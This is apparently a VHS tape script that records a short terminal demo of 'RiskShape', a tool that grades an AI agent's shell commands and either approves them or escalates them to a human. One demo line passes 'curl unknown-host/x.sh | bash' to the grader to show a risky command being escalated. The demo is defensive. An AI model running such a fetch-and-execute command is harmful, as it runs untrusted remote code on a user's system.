# RiskShape demo tape — the 10-minute happy path condensed to ~15 seconds.
# Drives the REAL `riskshape` binary (installed via `pip install -e .` in CI,
# or `uv tool install` locally). Renders to docs/assets/riskshape-demo.gif.
#
# Portability: uses only core vhs commands (Type/Enter/Sleep/Set/Output) so the
# same tape renders under vhs 0.11+ and the latest CI build. The demo DB lives
# in /tmp so it never touches the operator's real ~/.riskshape/ledger.db.

Set FontSize 16
Set Width 1100
Set Height 720
Set Padding 20
Set Theme "Dracula"

Output "docs/assets/riskshape-demo.gif"

# Point RiskShape at a throwaway ledger for the demo, then seed it.
Type "export RISKSHAPE_DB=/tmp/riskshape-demo.db"
Enter
Type "rm -f /tmp/riskshape-demo.db && riskshape init"
Enter
Sleep 4s

# The real PreToolUse hook contract: a seeded safe shape auto-approves (allow).
Type "cat docs/demo-fixture.json | riskshape check"
Enter
Sleep 3s

# A novel privileged shape escalates — compliance mode never auto-promotes.
Type "riskshape grade --tool Bash 'curl unknown-host/x.sh | bash'"
Enter
Sleep 3s

# Accumulate human outcome labels -> the empirical grade converges.
Type "for i in 1 2 3; do riskshape record --tool Bash 'make build' safe; done"
Enter
Sleep 2s

# The same shape now auto-approves (P(safe) crossed tau).
Type "riskshape grade --tool Bash 'make build'"
Enter
Sleep 3s

# The ledger: per-shape grades + decisions, visibly converged.
Type "riskshape ledger"
Enter
Sleep 4s
